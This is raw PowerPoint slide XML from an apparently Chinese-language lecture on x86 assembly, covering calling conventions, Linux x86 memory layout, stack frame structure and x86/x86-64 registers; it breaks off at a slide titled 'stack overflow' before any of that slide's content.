              <a:t>),%</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>eax</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas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addl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> 8(%</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>ebp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>),%</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>eax</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas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latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>popl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> %</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>ebp</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas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smtClean="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>ret</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN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3868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调用约定（</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>Calling Convention</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>）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039025"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="630382" y="3703105"/>
          <a:ext cx="212898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8982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return address</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="0" baseline="0" dirty="0" smtClean="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t> (caller)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 smtClean="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>%</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="0" baseline="0" dirty="0" err="1" smtClean="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>ebp</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="0" baseline="0" dirty="0" smtClean="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t> in caller’s caller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altLang="zh-CN" sz="16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ret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return</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="0" baseline="0" dirty="0" smtClean="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t> address (</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="0" baseline="0" dirty="0" err="1" smtClean="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>callee</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-CN" sz="16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%</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="0" dirty="0" err="1" smtClean="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>ebp</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="0" baseline="0" dirty="0" smtClean="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t> in caller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892" y="1226300"/>
            <a:ext cx="5645727" cy="476666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r="2958"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="183578" y="1226300"/>
            <a:ext cx="3115516" cy="243448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564064" y="1447373"/>
            <a:ext cx="5013496" cy="36867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536754" y="3333061"/>
            <a:ext cx="5013496" cy="36867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523099" y="5593767"/>
            <a:ext cx="5013496" cy="36867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536754" y="2551000"/>
            <a:ext cx="5013496" cy="36867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790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kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>内存分布</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2400" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(Linux X86)</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1"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kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>栈</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>共享库</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>堆</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Data(Global/Static)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Text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253268"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="5079226" y="1322168"/>
          <a:ext cx="1406958" cy="4856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6958"/>
              </a:tblGrid>
              <a:tr h="3119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FFFFFF"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>For </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1" smtClean="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Kernal</a:t>
                      </a:r>
                      <a:endParaRPr lang="zh-CN" altLang="en-US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Stack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shared libraries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869495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811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Heap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Data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F9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1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Unused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4" name="直线箭头连接符 23"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="5773398" y="3978678"/>
            <a:ext cx="0" cy="5117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/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5773398" y="2126379"/>
            <a:ext cx="0" cy="5307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994367" y="1531017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0xC0000000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27" name="直线箭头连接符 26"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="6486691" y="1686363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7000240" y="3467324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0x40000000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29" name="直线箭头连接符 28"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="6481965" y="3618327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7010400" y="6025557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0x00000000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31" name="直线箭头连接符 30"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="6486218" y="6176560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009099" y="5664897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0x08048000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6484917" y="5815900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997347" y="1167918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0xFFFFFFFF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35" name="直线箭头连接符 34"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="6489671" y="1323264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016102" y="1889416"/>
            <a:ext cx="792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0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>%</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>esp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cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="37" name="直线箭头连接符 36"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4647831" y="2114186"/>
            <a:ext cx="43788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64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kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>栈帧结构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871009"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="992908" y="1727200"/>
          <a:ext cx="3010131" cy="41187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0131"/>
              </a:tblGrid>
              <a:tr h="67056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rgbClr val="000000"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>arguments</a:t>
                      </a:r>
                      <a:endParaRPr lang="zh-CN" alt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rgbClr val="000000"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>return address</a:t>
                      </a:r>
                      <a:endParaRPr lang="zh-CN" alt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rgbClr val="000000"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>stack</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-CN" b="1" baseline="0" dirty="0" smtClean="0">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t> frame pointer</a:t>
                      </a:r>
                      <a:endParaRPr lang="zh-CN" alt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360817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 err="1" smtClean="0">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>callee</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0" smtClean="0">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t> saved registers</a:t>
                      </a:r>
                      <a:endParaRPr lang="zh-CN" altLang="en-US" b="1" dirty="0" smtClean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588182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 smtClean="0">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>local variables</a:t>
                      </a:r>
                      <a:endParaRPr lang="zh-CN" altLang="en-US" b="1" dirty="0" smtClean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717765"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="5458822" y="1368497"/>
          <a:ext cx="1406958" cy="4856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6958"/>
              </a:tblGrid>
              <a:tr h="3119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1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>For </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1" smtClean="0">
                          <a:solidFill>
                            <a:schemeClr val="bg1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Kernal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Stack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shared libraries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869495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811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Heap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Data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F9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1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Unused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7" name="直线箭头连接符 6"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="6152994" y="4025007"/>
            <a:ext cx="0" cy="5117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线箭头连接符 7"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6152994" y="2172708"/>
            <a:ext cx="0" cy="5307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373963" y="1577346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0xC0000000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10" name="直线箭头连接符 9"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="6866287" y="1732692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379836" y="3513653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0x40000000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12" name="直线箭头连接符 11"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="6861561" y="3664656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389996" y="6071886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0x00000000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14" name="直线箭头连接符 13"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="6865814" y="6222889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388695" y="5711226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0x08048000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16" name="直线箭头连接符 15"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="6864513" y="5862229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376943" y="1214247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0xFFFFFFFF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18" name="直线箭头连接符 17"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="6869267" y="1369593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左大括号 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4791676" y="1727200"/>
            <a:ext cx="667146" cy="445508"/>
          </a:xfrm>
          <a:prstGeom prst="leftBrace">
            <a:avLst>
              <a:gd name="adj1" fmla="val 8333"/>
              <a:gd name="adj2" fmla="val 51540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</a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="右大括号 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4043680" y="1732692"/>
            <a:ext cx="747996" cy="4099148"/>
          </a:xfrm>
          <a:prstGeom prst="rightBrace">
            <a:avLst>
              <a:gd name="adj1" fmla="val 8333"/>
              <a:gd name="adj2" fmla="val 5355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180" y="3440553"/>
            <a:ext cx="792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0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>%</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ebp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cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="22" name="直线箭头连接符 21"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="681182" y="3664656"/>
            <a:ext cx="31172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4025719" y="3664656"/>
            <a:ext cx="23414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 flipH="1">
            <a:off x="4025719" y="2048082"/>
            <a:ext cx="234143" cy="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 flipV="1">
            <a:off x="4246254" y="2048082"/>
            <a:ext cx="0" cy="162111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327724" y="1832049"/>
            <a:ext cx="3463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 smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>previous stack frame pointer</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1"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1437" y="4920681"/>
            <a:ext cx="792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0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>%</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>esp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cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="28" name="直线箭头连接符 27"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="676439" y="5144784"/>
            <a:ext cx="31172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04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X86-64</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>寄存器</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Rectangle 1"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="762000" y="5264870"/>
            <a:ext cx="3556000" cy="533400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EFBFB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</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Rectangle 6"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2552700" y="16453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%eax</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Rectangle 7"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2552700" y="22549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%ebx</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Rectangle 8"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2552700" y="28645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%ecx</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Rectangle 9"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2552700" y="34741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%edx</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Rectangle 10"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2552700" y="40837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%esi</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Rectangle 11"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2552700" y="46933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%edi</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rectangle 12"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2552700" y="5302970"/>
            <a:ext cx="1752600" cy="444500"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF99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%esp</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Rectangle 13"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2552700" y="58998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%ebp</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Rectangle 14"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6515100" y="16453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%r8d</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Rectangle 15"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6515100" y="22549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%r9d</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Rectangle 16"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6515100" y="28645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%r10d</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Rectangle 17"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6515100" y="34741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%r11d</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Rectangle 18"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6515100" y="40837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%r12d</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Rectangle 19"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6515100" y="46933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%r13d</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Rectangle 20"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6515100" y="53029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%r14d</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Rectangle 21"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6515100" y="591257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%r15d</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Rectangle 22"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4724400" y="16072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23" name="Rectangle 23"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4724400" y="22168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24" name="Rectangle 24"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4724400" y="28264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</a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Rectangle 25"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4724400" y="34360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</a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Rectangle 26"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4724400" y="40456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27" name="Rectangle 27"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4724400" y="46552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28" name="Rectangle 28"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4724400" y="52648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  <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Rectangle 29"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4724400" y="58744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</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Rectangle 30"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="762000" y="16072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31" name="Rectangle 31"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="762000" y="22168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32" name="Rectangle 32"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="762000" y="28264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%rcx</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Rectangle 33"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="762000" y="34360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%rdx</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="34" name="Rectangle 34"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="762000" y="40456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%rsi</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="Rectangle 35"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="762000" y="46552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%rdi</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="36" name="Rectangle 36"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="762000" y="587447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%rbp</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="213473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栈溢出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23516"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
